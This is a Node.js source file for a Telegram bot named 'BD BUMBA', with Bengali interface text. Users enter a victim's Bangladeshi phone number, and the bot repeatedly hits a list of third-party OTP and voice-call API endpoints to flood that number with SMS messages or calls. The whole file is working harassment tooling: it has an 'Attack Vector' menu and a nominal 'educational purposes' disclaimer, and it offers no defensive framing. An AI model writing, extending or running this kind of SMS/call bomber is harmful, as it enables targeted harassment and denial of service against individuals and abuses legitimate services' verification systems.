require('dotenv').config();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');

const TOKEN = process.env.BOT_TOKEN;
if (!TOKEN) {
  console.error('[boot] BOT_TOKEN missing.');
  process.exit(1);
}

const bot = new TelegramBot(TOKEN, { polling: true });
const sessions = new Map();
let ALL_APIS = [];
let SMS_APIS = [];
let CALL_APIS = [];

// Load and separate the APIs from apis.json
try {
  const rawData = fs.readFileSync(path.join(__dirname, 'apis.json'), 'utf8');
  ALL_APIS = JSON.parse(rawData).apis || [];
  
  // Separate Call vs SMS
  CALL_APIS = ALL_APIS.filter(api => 
    api.url.includes('/call/') || 
    api.url.includes('voice') || 
    api.url.includes('ivr') ||
    api.name.toLowerCase().includes('call')
  );
  
  SMS_APIS = ALL_APIS.filter(api => 
    !api.url.includes('/call/') && 
    !api.url.includes('voice') && 
    !api.url.includes('ivr') &&
    !api.name.toLowerCase().includes('call')
  );
  
  console.log(`[boot] Loaded ${SMS_APIS.length} SMS APIs and ${CALL_APIS.length} CALL APIs.`);
} catch (e) {
  console.error('[boot] apis.json not found or invalid format.');
  process.exit(1);
}

const WARNING = 
  "⚠️ *WARNING SYSTEM*\n\n" +
  "This bot is strictly for educational and testing purposes.\n" +
  "We are not responsible for any misuse or damage caused.\n" +
  "Do not use this on unknown numbers.\n\n" +
  "👇 *Select Attack Vector:*";

function getVectorMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: '📞 CALL BOMBING', callback_data: 'vec_call' }],
        [{ text: '💬 SMS BOMBING', callback_data: 'vec_sms' }]
      ]
    }
  };
}

// The Attack Loop
async function startBombing(targetPhone, mode, chatId, messageId, session) {
  let successCount = 0;
  let failCount = 0;
  let isRunning = true;
  
  const targetApis = mode === 'call' ? CALL_APIS : SMS_APIS;
  const modeName = mode === 'call' ? '📞 CALL' : '💬 SMS';
  
  session.stopBomb = () => { isRunning = false; };

  const updateProgress = async () => {
    try {
      await bot.editMessageText(
        `💣 *BD BUMBA ${modeName} চলছে...*\n\n` +
        `📱 টার্গেট: ${targetPhone}\n` +
        `✅ সফল: ${successCount}\n` +
        `❌ ব্যর্থ: ${failCount}\n` +
        `⏱️ গতি: ১ রিকোয়েস্ট / সেকেন্ড\n\n` +
        `_বন্ধ করতে নিচের বাটনে ক্লিক করুন..._`,
        { 
          chat_id: chatId, 
          message_id: messageId, 
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [[{ text: '🛑 বোম্বিং বন্ধ করুন (STOP)', callback_data: 'stop_bomb' }]]
          }
        }
      );
    } catch (e) {} 
  };

  await updateProgress();

  let apiIndex = 0;
  while (isRunning) {
    if (apiIndex >= targetApis.length) {
      apiIndex = 0; // Loop back
    }

    const api = targetApis[apiIndex];
    
    (async () => {
      try {
        let url = api.url.replace(/\*{5}/g, targetPhone).replace(/\{phone\}/g, targetPhone);
        let body = api.body ? api.body.replace(/\*{5}/g, targetPhone).replace(/\{phone\}/g, targetPhone) : "";
        let headers = api.headers || {};
        
        if (headers['content-length']) delete headers['content-length'];

        const options = {
          method: api.method.toLowerCase(),
          url: url,
          headers: headers,
          timeout: 4000 
        };
        
        if (api.method.toLowerCase() === "post") {
            if (headers['content-type'] && headers['content-type'].includes('application/json')) {
                try { options.data = JSON.parse(body); } catch (e) { options.data = body; }
            } else {
                options.data = body;
            }
        }

        await axios(options);
        successCount++;
      } catch (error) {
        failCount++;
      }
    })();

    apiIndex++;
    await new Promise(r => setTimeout(r, 1000)); 

    if ((successCount + failCount) % 5 === 0) {
      await updateProgress();
    }
  }

  await bot.editMessageText(
    `✅ *${modeName} বোম্বিং বন্ধ হয়েছে!*\n\n` +
    `📱 টার্গেট: ${targetPhone}\n` +
    `✅ মোট সফল: ${successCount}\n` +
    `❌ মোট ব্যর্থ: ${failCount}\n\n` +
    `_BD BUMBA ইঞ্জিন বন্ধ করা হয়েছে।_`,
    { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' }
  );
}

// Handlers
bot.onText(/^\/start$/, async (msg) => {
  const chatId = msg.chat.id;
  sessions.set(chatId, { step: 'choose_vector' });
  bot.sendMessage(chatId, WARNING, { parse_mode: 'Markdown', ...getVectorMenu() });
});

bot.on('callback_query', async (q) => {
  const chatId = q.message.chat.id;
  const data = q.data;
  const session = sessions.get(chatId);

  if (data.startsWith('vec_') && session) {
    const mode = data.split('_')[1]; // 'call' or 'sms'
    session.mode = mode;
    session.step = 'await_number';
    sessions.set(chatId, session);
    
    await bot.answerCallbackQuery(q.id);
    const modeName = mode === 'call' ? 'CALL' : 'SMS';
    return bot.sendMessage(chatId, `✅ ${modeName} মোড সিলেক্ট করা হয়েছে।\n\nআপনার টার্গেট নাম্বারটি দিন (11 ডিজিট):`);
  }

  if (data === 'start_bomb' && session && session.phone) {
    await bot.answerCallbackQuery(q.id, { text: 'বোম্বিং চালু হচ্ছে...' });
    
    const progressMsg = await bot.sendMessage(
      chatId, 
      `💣 *ইঞ্জিন চালু হচ্ছে...*`,
      { parse_mode: 'Markdown' }
    );

    startBombing(session.phone, session.mode, chatId, progressMsg.message_id, session);
  }

  if (data === 'stop_bomb' && session) {
    await bot.answerCallbackQuery(q.id, { text: 'বন্ধ করা হচ্ছে...' });
    if (session.stopBomb) {
      session.stopBomb();
    }
  }
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = (msg.text || '').trim();
  if (text.startsWith('/')) return;

  const session = sessions.get(chatId);
  if (!session || session.step !== 'await_number') return;

  if (!/^01\d{9}$/.test(text)) {
    return bot.sendMessage(chatId, '❌ ভুল নাম্বার। ১১ ডিজিটের নাম্বার দিন (উদাহরণ: 01712345678)।');
  }

  session.phone = text;
  session.step = 'ready';
  sessions.set(chatId, session);

  const modeName = session.mode === 'call' ? '📞 CALL' : '💬 SMS';

  bot.sendMessage(chatId, `✅ নাম্বার সেট হয়েছে: *${text}*\nমোড: ${modeName}\n\nনিচের বাটনে ক্লিক করে শুরু করুন:`, {
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [[{ text: '🚀 বোম্বিং শুরু করুন (Start)', callback_data: 'start_bomb' }]]
    }
  });
});

bot.on('polling_error', (e) => console.error('[polling]', e.message));
console.log(`[boot] BD BUMBA Dual Engine Online.`);